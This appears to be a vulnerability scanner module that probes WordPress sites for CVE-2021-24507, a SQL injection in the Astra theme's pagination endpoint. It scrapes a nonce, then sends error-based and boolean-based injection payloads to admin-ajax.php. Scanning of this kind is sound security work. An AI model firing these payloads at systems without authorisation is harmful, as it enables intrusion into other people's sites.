# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24507

from __future__ import unicode_literals
import requests
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

def retrieve_nonce(profile_url):
    headers = {
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }
    response = session.get(profile_url, headers=headers, allow_redirects=True, verify=False)
    if 'infinite_nonce' in response.text:
        nonce = re.compile('infinite_nonce":"(.+?)",').findall(str(response.text))[0]
        return nonce, response.url
    else:
        print("Error: Unable to find Nonce.")
        exit()

def submit_request(profile_url, nonce, payload):
    data = {
        "action": "astra_shop_pagination_infinite",
        "page_no": "1",
        "nonce": "{}".format(nonce),
        "query_vars": r'{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["' + payload + r'"]}}}',
        "astra_infinite": "astra_pagination_ajax"
    }
    headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    profile_url += '/wp-admin/admin-ajax.php'
    response = session.post(profile_url, headers=headers, data=data, verify=False)
    return response.text

def assess_sqli_vulnerability(profile_url, nonce):
    response = submit_request(profile_url, nonce, "'")
    if 'database error' in response:
        return True, 'Vulnerable to Error-Based SQL Injection.'
    
    response1 = submit_request(profile_url, nonce, '9656)) and ((7556=1223')
    response2 = submit_request(profile_url, nonce, '9634)) or ((6532=6532')
    if response1 == '' and (len(response2) > len(response1)):
        return True, 'Vulnerable to Boolean-Based SQL Injection.'
    
    return False, 'Not Vulnerable.'

def scan_cve_2021_24507(target):
    nonce, resolved_url = retrieve_nonce(target)
    vulnerability_status = assess_sqli_vulnerability(resolved_url, nonce)
    print(vulnerability_status[1])

